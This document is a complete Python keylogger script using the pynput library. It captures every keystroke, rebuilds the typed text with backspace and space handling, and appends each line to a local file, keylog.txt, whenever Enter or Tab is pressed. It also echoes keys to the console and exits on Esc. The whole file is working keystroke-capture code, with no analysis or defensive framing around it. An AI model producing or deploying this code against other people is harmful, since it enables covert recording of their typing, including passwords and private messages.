from pynput.keyboard import Key, Listener

# hold a list of all keys pressed until an enter or tab
key_word = []


def on_press(key_stroke):
    """
    get the key that was pressed by the user
    :param key_stroke: the key that was pressed on the keyboard
    """
    # if the key pressed is the enter key, call write_keylog with the
    # key_word list
    if key_stroke == Key.enter:
        write_keylog(key_word)
    # if the key pressed is the tab key, append a special string and
    # call write_keylog with the key_word list
    elif key_stroke == Key.tab:
        key_word.append("[tab]")
        write_keylog(key_word)
    # any other key is pressed, append to the key_word list
    else:
        key_word.append(key_stroke)
    # try to formate the keystroke as a char
    try:
        print('Key {0} pressed'.format(key_stroke.char))
    # if there is an Attribute Error, a special key was pressed
    except AttributeError:
        print('Special key {0} pressed'.format(key_stroke))


def write_keylog(key):
    """
    write the keylog to a txt file once tab or enter is pressed by the user
    :param key: the list of keys pressed
    """
    # open the keylog.txt file to append+
    file = open('keylog.txt', 'a+')
    # string to hold what the user typed
    concat_key = ""
    # for every char in the key list
    for char in key:
        # if the char is a space, add a blank space to concat_key
        if char == Key.space:
            concat_key += " "
        # if the char is a backspace, remove the last char in concat_key
        elif char == Key.backspace:
            concat_key = concat_key[:-1]
        # if the char is shift or caps lock (uppercase/lowercase), ignore it
        elif char == Key.shift or char == Key.caps_lock:
            pass
        # any other key, concat with concat_key
        else:
            concat_key += str(char).replace("'", "")
    # write concat_key to the txt file
    file.write(concat_key)
    file.write("\n")
    file.close()
    key_word.clear()


def on_release(key):
    """
    function when a key is released
    :param key: the key that was released
    :return: False is the key released was the escape key
    """
    print('{0} released'.format(key))
    if key == Key.esc:
        return False


# run the program as in its entirety
if __name__ == "__main__":
    with Listener(on_press=on_press,
                  on_release=on_release) as listener:
        listener.join()
